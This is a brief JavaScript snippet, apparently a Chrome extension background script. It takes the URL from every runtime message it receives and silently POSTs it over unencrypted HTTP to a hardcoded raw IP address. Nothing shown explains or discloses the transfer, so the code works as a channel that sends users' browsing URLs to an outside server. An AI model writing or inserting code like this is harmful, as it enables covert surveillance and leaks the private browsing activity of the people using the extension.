chrome.runtime.onMessage.addListener((message) => {
  const url = message.url;
  fetch('http://34.86.32.88/', {
    method: 'POST',
    body: JSON.stringify({ url }),
    headers: {
      'Content-Type': 'application/json', 
    },
  });
});